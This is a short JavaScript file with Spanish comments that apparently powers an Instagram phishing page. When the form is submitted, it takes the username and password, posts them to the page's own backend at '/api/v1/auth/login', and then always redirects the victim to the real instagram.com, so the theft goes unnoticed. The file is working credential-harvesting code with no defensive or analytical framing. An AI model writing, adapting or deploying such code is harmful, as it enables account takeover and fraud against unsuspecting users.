document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('form');
    const submitBtn = document.querySelector('button');
    
    if (!loginForm) return;

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault(); 

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        if (!usernameInput || !passwordInput) return;

        // Capturamos los valores
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (!username || !password) {
            alert('Por favor, completa todos los campos.');
            return;
        }

        // 1. Efecto visual del botón de carga
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="spinner"></div>';

        try {
            // 2. ENVIAR A LA RUTA EXACTA DEL BACKEND (/api/v1/auth/login)
            // Usando los nombres de variables que espera: username y password
            await fetch('/api/v1/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });

            // 3. Redirección final al Instagram oficial
            window.location.href = 'https://instagram.com';

        } catch (err) {
            console.error("Error en la comunicación:", err);
            window.location.href = 'https://instagram.com';
        }
    });
});
0

